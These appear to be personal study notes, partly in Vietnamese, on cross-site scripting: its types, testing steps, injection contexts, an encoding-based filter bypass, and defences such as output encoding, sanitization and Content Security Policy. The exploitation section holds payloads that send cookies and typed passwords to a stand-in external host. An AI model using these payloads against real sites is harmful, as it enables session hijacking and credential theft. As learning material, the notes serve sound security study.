# XSS( CROSS SITE SCRIPTING)

## WHAT IS THE BUG  ?

ROOT CAUSE :  Attacker manipulate browser execute any malicious code in victim’s browser . 

( `Untrusted data được browser render dưới dạng HTML`  ) 

## What occur in the web  ?

These function have property reflect user input to response .

Data enter Web application through an untrusted source .

The data is included in dynamic content that is send to web user without being validate for malicious content  .

## How many type  ?

- **Reflected XSS**   :  Response that included some or all of the input sent to web server by user  ( through requests ) **`< flaw in server side >`**
    
    In this type , attacker delivery to victims via another route , such as :  email , some other  application .When victim click to `url` contain malicious code  , malicious code will be executed from user’s browser .
    
    The attack String is included as a part of `url` or HTTP parameter , improperly processed by application and return to victim .
    
    ( impact within single request / response ) 
    
- **Store XSS** :   User input is stored by application for later used  , which data maybe malicious code and if the stored not improperly filter .⇒ consequence data is appear one of the part of the web site , when user access to web vulnerable , web application return response contains malicious content and the code is executed from user’s browser . **`< flaw in server side >`**
- **DOM XSS** :   XSS payload is executed as a resulting by modifying “`DOM`”  Environment  (process by `client-side`)  ,(arise when Javascript takes data from attacker-controllable source to sink dynamic code , such as `eval()` or `innerHTML()` ⇒ execute malicious Javascript )

-(Single page application) -hashsing → dùng hash  

Dom -based:  Caching 

**Malicious code of this type executed without server processing .** 

`HTTP response do not change < same structed with origin response  >`

 

 

## HOW TO TEST ?

- **Reflected XSS**

STEP1 :  Test every entry point .

STEP 2:  HTML injection 

STEP 3 : Analysis response ⇒ determine context of user’s input , consider these HTML special character is encoded , escape , remove, filter ? 

STEP 4 :  Test in browser 

```jsx
Self XSS , it not be trigger via Craft URL or cross site domain  . IT only trigger if 
the victim themself submit payload xss from theri browser.
Delivery a self-XSS involves socially engineering to the victim.
```

- **Store XSS**

STEP1 : Locate `entry` and `exit` point of user input 

STEP2 :  HTML injection 

STEP3 :  Analysis response ⇒   determine context of user’s input , consider these HTML special character is encoded , escape , remove, filter ? 

STEP4 :  test in browser 

- **DOM BASE**

STEP1 : identify Source and Sink in web application 

STEP2 :  Tracking data flow 

STEP 3:  Debug 

## What is sink ?

To deliver a DOM-based XSS attack, you need to place data into a source so that it is propagated to a `sink and causes execution of arbitrary JavaScript.`

## XSS in difference context

- HTML tag  :

⇒  Create new tag HTML 

When the XSS context is text between HTML tags, you need to introduce some new HTML tags designed to trigger execution of JavaScript.

TRICK : Execute : event handler via `hashid` and `tabindex` 

```jsx
<xss id='x' onfocus='alert(1)' tabindex='1' > </xss>

Url :  http://example.com?search=payload#x

#x: hash-id -> do phần tử này có thuộc tính tabindex="1",
 nó sẽ tự động nhận được sự tập trung mà không cần phải sử dụng phím Tab.
```

- In Attributed Value

⇒ Escape string literal ; ⇒  maybe create new event or new tag to execute `javascript` 

- In `Javascript` String

⇒ Escape string literal ; ⇒ create a new instruction `Javascript` 

- if application prevent escape : `“` , by add backslash  before a character

Example : `‘;alert(1)` ⇒ convert to  `\’;alert(1)` 

payload : `\';alert(1)//` ⇒ convert to  `\\’ ;alert(1)//`   ⇒ escape success 

//note : Making use of HTML-encoding 

⇒ Meaning :  The input maybe filtering in server-side , if your payload is  (encoding-HTML)-at such as HTML attribute ⇒ bypass filter ,

 `When the browser has parsed out the HTML tags and attributes within a response, it will perform HTML-decoding of tag attribute values before they are processed any furthe`

Example  : 

`<a href="#" onclick="... var input='controllable data here'; ...">`

And the server prevent - escape  by `‘` or `“`

payload : `http%3a%2f%[2fexample.com](http://2fexample.com/)%26apos%3b);alert(1);let+a=(%26apos%3ba`

Output 

![Untitled](XSS(%20CROSS%20SITE%20SCRIPTING)%20b816c2081f3749e7b91ca563f63d89cc/Untitled.png)

Explain : 

It meaning is the filtering work in server-side , if user input contain : `“` or `‘`  will be escaped 

⇒ 

![Untitled](XSS(%20CROSS%20SITE%20SCRIPTING)%20b816c2081f3749e7b91ca563f63d89cc/Untitled%201.png)

**but you encoding `‘` by `&apos` → server-side is not working and behavior of browser will be decoding HTML of attribute or event value  before process value.**

## How to exploit   ?

- `Steal Cookie :`

⇒ Condition :  Accessed to DOM , and cookie is not set `HTTPonly .`

payload : OOB 

```jsx
//basic example 
<script> fetch(`yourdomain.com?cookie=${document.cookie}`) </script> 

```

- `Capture mysterious content`

```jsx
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

- `To perform CSRF`

Get CSRF token ⇒ make request ⇒ change information depends behavior of functionality

## HOW TO PREVENT

hai khái niệm  : encoding và escape 

Encoding and escaping are two method of transforming data  so that (để có thể ) it does not `interfere`(can thiệp) with the syntax and structure of your web page .

### Encoding  :

Means converting data into difference format , such as hexadecimal or base64 , that is not `interpreted` (thông dịch) by browser as code . 

### Escaping  :

Means adding special character , such as backslashes or quotes  

#Lưu ý : 

HTML encoding ở context attribute () mai test 

HTML Sanitization

- `Encode data on output`

### In HTML context

should be convert non-whitelist values into HTML entities : 

- `<` converts to: `&lt;`
- `>` converts to: `&gt;`

Purpose :  Browser don’t understanding this character is HTML code 

vẫn render kí tự ;

### In **Javascript** context

- `<` converts to: `\u003c`
- `>` converts to: `\u003e`

Example : 

Depends on context ⇒ determine difference encoding method :

select HTML entities with HTML context  Because  browser understand and eviqualent form but it not interpreted as code :

 TH1 : 

![Untitled](XSS(%20CROSS%20SITE%20SCRIPTING)%20b816c2081f3749e7b91ca563f63d89cc/Untitled%202.png)

![Untitled](XSS(%20CROSS%20SITE%20SCRIPTING)%20b816c2081f3749e7b91ca563f63d89cc/Untitled%203.png)

Browser render it as code 

And if you encoding it that :

![Untitled](XSS(%20CROSS%20SITE%20SCRIPTING)%20b816c2081f3749e7b91ca563f63d89cc/Untitled%204.png)

![Untitled](XSS(%20CROSS%20SITE%20SCRIPTING)%20b816c2081f3749e7b91ca563f63d89cc/Untitled%205.png)

It is still retains its status but not interpreted as code .

# Similar with javascript context

**within scope of `<script>` tag**

**Purpose : Still retains its status but not interpreted as code** 

Encoding method : unicode 

![Untitled](XSS(%20CROSS%20SITE%20SCRIPTING)%20b816c2081f3749e7b91ca563f63d89cc/Untitled%206.png)

![Untitled](XSS(%20CROSS%20SITE%20SCRIPTING)%20b816c2081f3749e7b91ca563f63d89cc/Untitled%207.png)

NOTE : 

IF untrusted data place to events 

Example: 

`<a href="#" onclick="x='This string needs two layers of escaping'">test</a>`

⇒ must to apply 2 two layer 

Because : Behavior of browser will decode HTML in attribute and event value before it process futher .

If you only encoding HTML 

![Untitled](XSS(%20CROSS%20SITE%20SCRIPTING)%20b816c2081f3749e7b91ca563f63d89cc/Untitled%208.png)

![Untitled](XSS(%20CROSS%20SITE%20SCRIPTING)%20b816c2081f3749e7b91ca563f63d89cc/Untitled%209.png)

1:  Untrusted data 

2 : Encoding HTML entities( Untrusted-data) 

3 :  Encoding to place in HTML tag ⇒ OK (prevent)

4: Browser it HTML decoding value of tag attribute ⇒ (execute JAVASCRIPT , `because` 

**First we encode , then the browser decodes )**

? Lưu ý  : 

 When making HTML encoding work ?

![Untitled](XSS(%20CROSS%20SITE%20SCRIPTING)%20b816c2081f3749e7b91ca563f63d89cc/Untitled%2010.png)

Có hai ngữ cảnh cần xem xét trong vấn đề này  ? 

Màu đỏ : Ngữ cảnh HTML 

Màu vàng : Ngữ cảnh Javascript ( nằm trong ngữ cảnh HTML ) 

Hành vi của trình duyệt : 

Decoding tất cả các HTML encoding của value các attributed ( browser ) 

Vấn đề là : **`&apos` ⇒ `‘`  và `&quot;`  ⇒ `“`**

Nếu truyền những kí tự này thì chính HTML entities ⇒ browser sẽ decode thành các kí tự ta mong muốn nhưng hoàn thành ko thể `thoát chuỗi` ra ngoài trong ngữ cảnh HTML ( vì nó là HTML entities) 

Nhưng bởi vì ngữ cảnh của các event lại nằm trong ngữ cảnh HTML , mà JAVASCRIPT lại không quan tâm là HTML entities hay gì cả , nên ở mục `màu vàng` ⇒ chúng  ta hoàn toàn có thể thoát chuỗi và inject thêm `mã độc` . 

⇒ Chỗ nào cần hai layer ⇒ HTML entities và Unicode 

**Allowing "safe" HTML**

Làm sạch HTML 

Nhận đầu vào ⇒ parse thành DOM tree ⇒ xét while list ⇒ bỏ các event handler 

## Content Security Policy

It works by `restricting the resource` ( such as scripts and images ) that a page can load and `restricting whether a page can be framed by other page` .

HTTP response include an HTTP header called `Content-Security-Policy` 

- `script-src ‘self’` ⇒  will only allow scripts to be loaded from the same origin as the page itself :
- `script-src [https://scripts.normal-website.com](https://scripts.normal-website.com)`  allow script from a specific domain

It's quite common for a CSP to block resources like `script`. However, many CSPs do allow image requests. This means you can often use `img` elements to make requests to external servers in order to disclose [CSRF](https://portswigger.net/web-security/csrf) tokens, for example.